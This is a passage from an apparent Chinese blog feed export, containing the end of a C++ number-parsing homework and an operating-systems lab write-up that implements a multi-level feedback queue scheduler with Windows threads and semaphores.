<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ptr1[i]==<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            char_dot++;</span><br><span class="line">            <span class="keyword">if</span>(char_dot&gt;=<span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;ERROR[1]:Too many dot!&quot;</span>&lt;&lt;endl;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ptr1[i]==<span class="string">&#x27;E&#x27;</span>||ptr1[i]==<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            char_e++;</span><br><span class="line">            <span class="keyword">if</span>(char_e&gt;=<span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;ERROR[2]:To many &#x27;E&#x27;!&quot;</span>&lt;&lt;endl;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    char_e=<span class="number">0</span>;</span><br><span class="line">    char_dot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len2;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> qwq=((ptr2[i]==<span class="string">&#x27;.&#x27;</span>||ptr2[i]==<span class="string">&#x27;-&#x27;</span>)||(ptr2[i]==<span class="string">&#x27;+&#x27;</span>||ptr2[i]==<span class="string">&#x27;E&#x27;</span>)||(ptr2[i]==<span class="string">&#x27;e&#x27;</span>));</span><br><span class="line">        <span class="keyword">if</span>(!((<span class="string">&#x27;0&#x27;</span>&lt;=ptr2[i]&amp;&amp;ptr2[i]&lt;=<span class="string">&#x27;9&#x27;</span>)||qwq))</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;ERROR[0]2:Please enter a valid number&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ptr2[i]==<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            char_dot++;</span><br><span class="line">            <span class="keyword">if</span>(char_dot&gt;=<span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;ERROR[1]:Too many dot!&quot;</span>&lt;&lt;endl;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ptr2[i]==<span class="string">&#x27;E&#x27;</span>||ptr2[i]==<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            char_e++;</span><br><span class="line">            <span class="keyword">if</span>(char_e&gt;=<span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;ERROR[2]:To many &#x27;E&#x27;!&quot;</span>&lt;&lt;endl;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Scientific_Notation</span><span class="params">(<span class="type">char</span>* ptr,<span class="type">int</span> *plen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">50</span>]=&#123;<span class="string">&#x27;\x00&#x27;</span>&#125;;</span><br><span class="line">    string s=ptr;</span><br><span class="line">    <span class="type">double</span> double_num;</span><br><span class="line">    <span class="type">int</span> eIndex = s.<span class="built_in">find</span>(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">    <span class="type">double</span> base = <span class="built_in">stod</span>(s.<span class="built_in">substr</span>(<span class="number">0</span>, eIndex)); <span class="comment">//获取小数部分</span></span><br><span class="line">    <span class="type">int</span> exp = <span class="built_in">stoi</span>(s.<span class="built_in">substr</span>(eIndex + <span class="number">1</span>)); <span class="comment">//获取指数部分</span></span><br><span class="line">    double_num= base * <span class="built_in">pow</span>(<span class="number">10</span>, exp);</span><br><span class="line">    <span class="built_in">sprintf</span>(ptr,<span class="string">&quot;%f&quot;</span>,double_num);</span><br><span class="line">    *plen=<span class="built_in">strlen</span>(ptr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Ptr_Print</span><span class="params">(<span class="type">char</span>*ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len=<span class="built_in">strlen</span>(ptr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;ptr[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Is_Scientific</span><span class="params">(<span class="type">char</span> *ptr,<span class="type">int</span> *plen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt; *plen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ptr[i]==<span class="string">&#x27;E&#x27;</span>||ptr[i]==<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Scientific_Notation</span>(ptr,plen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 大学课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 作业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统实验四——多级反馈队列调度算法</title>
      <link href="/2024/11/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E5%9B%9B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%A7%E5%8F%8D%E9%A6%88%E9%98%9F%E5%88%97%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/"/>
      <url>/2024/11/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E5%9B%9B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%A7%E5%8F%8D%E9%A6%88%E9%98%9F%E5%88%97%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统实验四——多级反馈队列调度算法"><a href="#操作系统实验四——多级反馈队列调度算法" class="headerlink" title="操作系统实验四——多级反馈队列调度算法"></a>操作系统实验四——多级反馈队列调度算法</h1><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p><strong>多级反馈队列</strong>**(****Multi-leveled feedback queue)**<strong>调度算法</strong></p><p>按以下要求实现多级反馈队列调度算法：假设有5个就绪队列，它们的优先级分别为1，2，3，4，5，它们的时间片长度分别为10ms,20ms,40ms,80ms,160ms，即第i个队列的优先级比第i-1个队列要低一级，但是时间片比第i-1个队列的要长一倍。调度算法包括四个部分：主程序main，进程产生器generator，进程调度器函数scheduler，进程运行器函数executor。</p><p>（1） <strong>主程序：</strong>设置好多级队列以及它们的优先级、时间片等信息；创建两个信号量，一个用于generator和executor互斥的访问第1个运行队列(因为产生的新进程都是先放到第1个队列等待执行)，另一个用于generator和scheduler的同步(即，仅当多级队列中还有进程等待运行时，scheduler才能开始执行调度)。创建进程产生器线程，然后调用进程调度器。</p><p>（2） <strong>进程产生器<strong><strong>g</strong></strong>enerator****：</strong>用线程来实现进程产生器。每隔一个随机的时间段，例如[1,100]ms之间的一个随机数，就产生一个新的进程，创建PCB并填上所有的信息。注意，每个进程所需要运行的时间neededTime在一定范围内(假设为[2,200]ms)内由随机数产生，初始优先级为1。PCB创建完毕后，将其插入到第1个队列进程链表的尾部（要用到互斥信号量，因为executor有可能正好从第1个队列中取出排在队列首的进程来运行）。插入完毕后，generator调用Sleep函数卡<strong>睡眠等待随机的一个时间间隔</strong><strong>(例如在[1，100</strong>**]<strong><strong>范围产生的</strong></strong>1个随机数****)**，然后再进入下一轮新进程的产生。当创建的进程数量达到预先设定的个数，例如20个，generator就执行完毕退出。</p><p>（3） <strong>进程调度器函数<strong><strong>scheduler</strong></strong>：</strong>在该函数中，依次从第1个队列一直探测到第5个队列，如果第1个队列不为空，则调用执行器executor来执行排在该队列首部的进程。仅当第i号队列为空时，才去调度第i+1个队列的进程。如果时间片用完了但是执行的进程还没有完成（即usedTime&lt;neededTime），则调度器把该进程移动到下一级队列的尾部。当所有的进程都执行完毕，调度器退出，返回主程序。</p><p>（4） <strong>进程执行器executor：</strong>根据scheduler传递的队列序号，将该队列进程链表首部的PCB取出，分配该队列对应的时间片给它运行(我们用Sleep函数，睡眠时间长度为该时间片，以模拟该进程得到CPU后的运行期间)。睡眠结束后，所有队列中的进程的等待时间都要加上该时间片。注意，在访问第1个队列时，要使用互斥信号量，以免跟进程产生器generator发生访问冲突。 </p><h2 id="实现思路："><a href="#实现思路：" class="headerlink" title="实现思路："></a>实现思路：</h2><p>假设五个就绪队列，它们的优先级为12345，其实数组索引就决定了优先级的顺序。这里考虑创建一个队列数组，然后根据索引，算出对应的时间即可。</p><p>队列用C++STL中的deque实现，这个数据结构有队列的性质，同时也具备遍历的功能，十分强大。</p><p>调度算法包含四个部分：main、进程产生器generator、进程调度器scheduler、进程运行器executor。main函数主要是信号量的设置和相关结构体的初始化，这里信号量设计mutex作为generator和executor第一个运行队列的互斥访问信号量；tongbu设置为generator和scheduler先后顺序的信号量；再来一个信号量mutex_sche进行对scheduler线程间操作临界资源的保护。其他基本上按照题目一一对应。</p><p>另外，信号量、线程和调度队列存储在一个结构体内，方便传参与管理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SIG</span> &#123;</span></span><br><span class="line">PRO* process[PROC_MAX_COUNT];</span><br><span class="line">HANDLE mutex;<span class="comment">//generator和executor互斥的访问第1个运行队列(</span></span><br><span class="line">HANDLE tongbu;<span class="comment">//用于generator和scheduler的同步</span></span><br><span class="line"><span class="built_in">deque</span>&lt;PRO*&gt; que[<span class="number">5</span>];<span class="comment">//10ms 20 40 80 160 //队列+数组</span></span><br><span class="line"><span class="type">unsigned</span> cap;<span class="comment">//时间片</span></span><br><span class="line"><span class="type">unsigned</span> ProcCount;<span class="comment">//用于已有进程计数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="遇到问题："><a href="#遇到问题：" class="headerlink" title="遇到问题："></a>遇到问题：</h2><ol><li>我们这里创建了两个函数的线程，这样才能实现产生进程和调度进程并行的效果。但是要注意，等待所有线程执行完毕的线程数组，要接收的是调度器的返回值。不然只是产生玩进程直接返回并不是我们先要的效果</li></ol><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730703713771-d2efacd9-0c99-404f-9911-b53b1b4c50f5.png" alt="img"></p><ol start="2"><li>for循环内（短时间一秒钟内）随机数相同的问题，这里用了srand(time(NULL))初始化种子，但是time函数的单位是秒。我们解决方法要么用sleep函数睡眠将近一秒钟的时间，要么用clock()函数，其单位是毫秒。这里采用clock，同时不影响速率。</li><li>调度时只采用了一层循环。这样并不能满足我们需要调度进程的流程，我们进程调度的流程是，按照优先级顺序判断是否有进程就绪，有则从队列头部取出进程，然后执行，执行完毕则删除头部的进程，否则移动至下一优先级进程，然后继续判断有无进程; 如果无则去往下一优先级的队列。</li></ol><h2 id="实验代码："><a href="#实验代码：" class="headerlink" title="实验代码："></a>实验代码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//产生最大进程数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROC_MAX_COUNT 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIGBIGBIG 9999</span></span><br><span class="line"><span class="comment">//PCB</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">PRO</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> pid;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> start_time;<span class="comment">//开始时间</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> need_time;<span class="comment">//需要的时间</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> run_time;<span class="comment">//已经运行的时间</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> end_time;<span class="comment">//完成时间</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> wait_time;<span class="comment">//等待的时间</span></span><br><span class="line"><span class="comment">//HANDLE proc;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SIG</span> &#123;</span></span><br><span class="line">PRO* process[PROC_MAX_COUNT];</span><br><span class="line">HANDLE mutex;<span class="comment">//generator和executor互斥的访问第1个运行队列(</span></span><br><span class="line">HANDLE tongbu;<span class="comment">//用于generator和scheduler的同步</span></span><br><span class="line"><span class="built_in">deque</span>&lt;PRO*&gt; que[<span class="number">5</span>];<span class="comment">//10ms 20 40 80 160 //队列+数组</span></span><br><span class="line"><span class="type">unsigned</span> cap;<span class="comment">//时间片</span></span><br><span class="line"><span class="type">unsigned</span> ProcCount;<span class="comment">//用于已有进程计数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//统计进程数量</span></span><br><span class="line"><span class="type">int</span> ProCessCount = <span class="number">0</span>;</span><br><span class="line">HANDLE mutex_sche;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">进程产生器，产生进程，有互斥量</span></span><br><span class="line"><span class="comment">需要传入信号量，队列等信息，线程实现（传递参数用的结构体）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">generator</span><span class="params">(SIG* sig)</span>;</span><br><span class="line"><span class="comment">//进程调度函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">scheduler</span><span class="params">(SIG* sig)</span>;</span><br><span class="line"><span class="comment">//进程执行器</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">executor</span><span class="params">(SIG* sig, <span class="type">int</span> quenum)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//优先级由队列组成的数组循环索引idx来自然实现，时间片同理。</span></span><br><span class="line">SIG sig;<span class="comment">//信号量等信息</span></span><br><span class="line">sig.mutex = CreateMutex(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">L&quot;mutex&quot;</span>);</span><br><span class="line">mutex_sche = CreateMutex(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">L&quot;Smutex_sche&quot;</span>);</span><br><span class="line">sig.tongbu = CreateSemaphore(<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">100</span>, <span class="string">L&quot;tongbu&quot;</span>);</span><br><span class="line">sig.cap = <span class="number">0</span>;</span><br><span class="line">sig.ProcCount = <span class="number">0</span>;</span><br><span class="line">HANDLE ThreadArray[PROC_MAX_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建进程产生器线程，然后调用进程调度器</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PROC_MAX_COUNT; i++)</span><br><span class="line">&#123;</span><br><span class="line">CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)generator, &amp;sig, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">ThreadArray[ProCessCount] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)scheduler, &amp;sig, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">ProCessCount++;</span><br><span class="line">&#125;</span><br><span class="line">WaitForMultipleObjects(PROC_MAX_COUNT, ThreadArray, <span class="literal">true</span>, INFINITE);<span class="comment">//一直等待，直到子进程全部返回</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">generator</span><span class="params">(SIG* sig)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//20</span></span><br><span class="line"></span><br><span class="line">WaitForSingleObject(sig-&gt;mutex, INFINITE);<span class="comment">//与executor互斥</span></span><br><span class="line"><span class="keyword">if</span> (sig-&gt;ProcCount &gt;= <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//每隔一个随机时段，产生一个新进程</span></span><br><span class="line">srand(clock());</span><br><span class="line">Sleep((rand() % <span class="number">99</span>));</span><br><span class="line">sig-&gt;process[sig-&gt;ProcCount] = (PRO *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PRO));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 填补PCB上面的信息</span></span><br><span class="line">sig-&gt;process[sig-&gt;ProcCount]-&gt;pid = sig-&gt;ProcCount;</span><br><span class="line">sig-&gt;process[sig-&gt;ProcCount]-&gt;need_time= rand() % <span class="number">198</span> + <span class="number">2</span>;</span><br><span class="line">sig-&gt;process[sig-&gt;ProcCount]-&gt;start_time = sig-&gt;cap;</span><br><span class="line">sig-&gt;process[sig-&gt;ProcCount]-&gt;run_time = <span class="number">0</span>;</span><br><span class="line">sig-&gt;process[sig-&gt;ProcCount]-&gt;end_time = BIGBIGBIG;</span><br><span class="line">sig-&gt;process[sig-&gt;ProcCount]-&gt;wait_time = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程%d产生,需要运行的时间:%d，开始时间:%d\n&quot;</span>, sig-&gt;process[sig-&gt;ProcCount]-&gt;pid, sig-&gt;process[sig-&gt;ProcCount]-&gt;need_time, sig-&gt;process[sig-&gt;ProcCount]-&gt;start_time, sig-&gt;process[sig-&gt;ProcCount]-&gt;start_time);</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入队列</span></span><br><span class="line"></span><br><span class="line">sig-&gt;que[<span class="number">0</span>].push_back(sig-&gt;process[sig-&gt;ProcCount]);<span class="comment">//入队队列指针</span></span><br><span class="line">sig-&gt;ProcCount++;</span><br><span class="line">ReleaseMutex(sig-&gt;mutex);<span class="comment">//释放互斥信号量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//插入完毕，调用Sleep</span></span><br><span class="line">ReleaseSemaphore(sig-&gt;tongbu,<span class="number">1</span>,<span class="literal">NULL</span>);<span class="comment">//释放同步信号量</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> sleep_time = rand() % <span class="number">99</span> + <span class="number">1</span>;</span><br><span class="line">Sleep(sleep_time);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">executor</span><span class="params">(SIG* sig,<span class="type">int</span> quenum)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//根据schedule传递的队列序号,取出pcb，然后分配该队列的时间片给它运行</span></span><br><span class="line"><span class="comment">//sleep</span></span><br><span class="line"></span><br><span class="line">WaitForSingleObject(sig-&gt;mutex, INFINITE);<span class="comment">//与generator互斥</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> tim = <span class="built_in">pow</span>(<span class="number">2</span>, (quenum + <span class="number">1</span>));<span class="comment">//睡眠的时间</span></span><br><span class="line"><span class="type">unsigned</span> timcap = tim * <span class="number">10</span>;</span><br><span class="line">PRO* temp;</span><br><span class="line"><span class="comment">//printf(&quot;size: %d\n&quot;, sig-&gt;que[quenum].size());</span></span><br><span class="line">temp = sig-&gt;que[quenum].front();<span class="comment">//取出队列中的元素但是不删除</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//睡眠结束后，所有队列中的进程的等待时间加上时间片</span></span><br><span class="line">Sleep(timcap);</span><br><span class="line">temp-&gt;run_time += timcap;</span><br><span class="line"><span class="comment">//printf(&quot;进程已运行%dms,进程需要运行的时间%d\n&quot;, temp-&gt;run_time,temp-&gt;need_time);</span></span><br><span class="line">sig-&gt;cap += timcap;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;队列情况\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">5</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;队列%d:&quot;</span>, i);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j&lt;sig-&gt;que[i].size(); j++) &#123;</span><br><span class="line"></span><br><span class="line">sig-&gt;que[i][j]-&gt;wait_time += timcap;<span class="comment">//通过下标访问deque</span></span><br><span class="line"><span class="keyword">if</span> (j != <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&lt;-&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sig-&gt;que[i][j]-&gt;pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;wait_time -= timcap;</span><br><span class="line">ReleaseMutex(sig-&gt;mutex);<span class="comment">//释放同步信号量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">scheduler</span><span class="params">(SIG* sig)</span></span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(sig-&gt;tongbu, INFINITE);</span><br><span class="line">WaitForSingleObject(mutex_sche, INFINITE);<span class="comment">//与generator互斥</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; sig-&gt;que[i].size(); j++) &#123;</span><br><span class="line"><span class="comment">//队列不为空则调用执行器</span></span><br><span class="line"><span class="comment">//printf(&quot;正在调度%d队列中的进程\n&quot;, i);</span></span><br><span class="line">executor(sig, i);</span><br><span class="line"><span class="comment">//时间片用完了，进程没执行完。调度器移动到下一级</span></span><br><span class="line"><span class="comment">//如果需要的时间依旧大于运行的时间，则移动到下一级队列尾部</span></span><br><span class="line"><span class="keyword">if</span> (sig-&gt;que[i].front()-&gt;need_time&gt; sig-&gt;que[i].front()-&gt;run_time) &#123;</span><br><span class="line"><span class="keyword">if</span> (i &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">sig-&gt;que[i + <span class="number">1</span>].push_back(sig-&gt;que[i].front());</span><br><span class="line">sig-&gt;que[i].pop_front();<span class="comment">//移动</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;进程%d运行结束，结束时间:%d\n&quot;</span>, sig-&gt;que[i].front()-&gt;pid, sig-&gt;cap);</span><br><span class="line">sig-&gt;que[i].front()-&gt;end_time = sig-&gt;cap;</span><br><span class="line">sig-&gt;que[i].pop_front();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ReleaseMutex(mutex_sche);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730703740521-c71c4675-8267-4d09-b5bd-422a1d3193d3.png" alt="img"></p>]]></content>
      
      
      <categories>
          
